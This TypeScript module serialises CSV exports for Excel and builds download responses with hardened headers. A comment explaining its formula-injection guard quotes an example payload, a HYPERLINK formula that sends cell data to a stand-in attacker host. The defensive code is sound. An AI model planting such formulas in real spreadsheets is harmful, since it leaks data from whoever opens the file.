import 'server-only'

/**
 * CSV serialisation.
 *
 * RFC 4180 with two deliberate departures, both because the overwhelming
 * consumer of these files is Excel:
 *
 *   - CRLF line endings, which RFC 4180 specifies and Excel requires.
 *   - A UTF-8 BOM, which Excel needs to read the file as UTF-8 rather than as
 *     the system codepage. Without it "₹" and any Devanagari in a supplier
 *     name arrive as mojibake. Every other consumer tolerates the BOM.
 */

export type CsvValue = string | number | boolean | null | undefined

/**
 * Quotes one field.
 *
 * The leading apostrophe guard is not decoration. Excel evaluates any cell
 * beginning `=`, `+`, `-` or `@` as a formula, so a product name of
 * `=HYPERLINK("http://attacker/"&A1)` — which an admin can type into the
 * catalogue — becomes a live formula in whoever opens the export. Prefixing a
 * tab neutralises it while displaying identically.
 */
function field(value: CsvValue): string {
  if (value == null) return ''

  let text = String(value)

  if (/^[=+\-@\t\r]/.test(text)) text = `\t${text}`

  if (/[",\r\n]/.test(text)) {
    return `"${text.replace(/"/g, '""')}"`
  }
  return text
}

export interface CsvColumn<T> {
  header: string
  value: (row: T) => CsvValue
}

export function toCsv<T>(rows: readonly T[], columns: readonly CsvColumn<T>[]): string {
  const lines = [columns.map((column) => field(column.header)).join(',')]

  for (const row of rows) {
    lines.push(columns.map((column) => field(column.value(row))).join(','))
  }

  return `﻿${lines.join('\r\n')}\r\n`
}

/**
 * A downloadable CSV response.
 *
 * `filename*=UTF-8''…` is the RFC 5987 form; the plain `filename=` beside it is
 * the fallback for clients that do not implement it. `no-store` because these
 * files contain commercial data and a shared cache must not keep a copy.
 */
export function csvResponse(csv: string, filename: string): Response {
  const safe = filename.replace(/[^\w.-]/g, '_')

  return new Response(csv, {
    headers: {
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': `attachment; filename="${safe}"; filename*=UTF-8''${encodeURIComponent(filename)}`,
      'Cache-Control': 'no-store, private',
      // The browser must not sniff this into something it will render.
      'X-Content-Type-Options': 'nosniff',
    },
  })
}

/** `sourcely-products-2026-08-23.csv` */
export function exportFilename(kind: string, now = new Date()): string {
  return `sourcely-${kind}-${now.toISOString().slice(0, 10)}.csv`
}
